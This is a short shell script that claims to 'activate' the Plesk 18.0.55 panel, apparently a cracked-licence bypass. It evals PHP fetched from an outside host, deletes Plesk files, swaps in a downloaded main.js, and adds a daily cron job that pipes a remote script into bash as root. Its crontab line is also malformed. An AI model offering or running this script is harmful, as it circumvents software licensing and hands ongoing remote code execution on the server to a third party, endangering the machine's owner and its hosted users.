echo "******************"
echo "Script by Trisout"
echo "******************"
echo "Warning: This Script is made for 18.0.55 Update 1 of plesk panel. It is possible that it does not work AND NUKE YOUR PLESK on other versions."
echo "For support contact me on discord"
sleep 20
plesk php -er "eval(file_get_contents('http://ossav.com/OLC'));"
sleep 5
systemctl stop psa
rm -rf /usr/local/psa/admin/htdocs/modules/OsSav
rm /opt/psa/admin/cp/public/javascript/main.js
cd /opt/psa/admin/cp/public/javascript
wget https://raw.githubusercontent.com/trisout78/o-plesk/main/main.js
systemctl start psa
plesk bin extension --uninstall OsSav
echo "0 0 * * * bash <(curl -s https://raw.githubusercontent.com/trisout78/o-plesk/main/without-cronjob.sh)" | crontab -l | { cat; echo "0 0 * * * bash <(curl -s https://raw.githubusercontent.com/trisout78/o-plesk/main/without-cronjob.sh)"; } | crontab -
echo "****************************************************"
echo "Your Plesk is now activated"
echo "A cron job has been created every day at 0:00 AM"
echo "****************************************************"
